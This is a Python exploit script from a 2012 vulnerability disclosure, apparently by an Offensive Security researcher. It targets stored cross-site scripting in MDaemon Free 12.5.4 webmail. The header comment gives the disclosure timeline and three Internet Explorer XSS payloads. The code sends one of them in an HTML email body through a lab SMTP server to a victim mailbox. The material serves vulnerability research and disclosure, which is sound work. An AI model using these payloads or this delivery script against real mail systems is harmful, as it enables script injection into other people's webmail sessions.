#!/usr/bin/python

'''

Author: loneferret of Offensive Security
Product: Alt-N MDaemon Free
Version: 12.5.4
Vendor Site: http://www.altn.com/
Software Download: http://www.altn.com/Downloads/

Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
18 Jul 2012: Vendor requests additional information from CERT. CERT advises vendor to contact the researcher.
08 Aug 2012: Public Disclosure

Installed On: Windows Server 2003 SP2
Client Test OS: Window XP Pro SP3 (x86)
Browser Used: Internet Explorer 8

Injection Point: Body
Injection Payload(s):
1: exp/*<XSS STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
2: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
3: <HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>

'''

import smtplib, urllib2

payload = """<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">"""

def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS" + payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()

username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"

print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)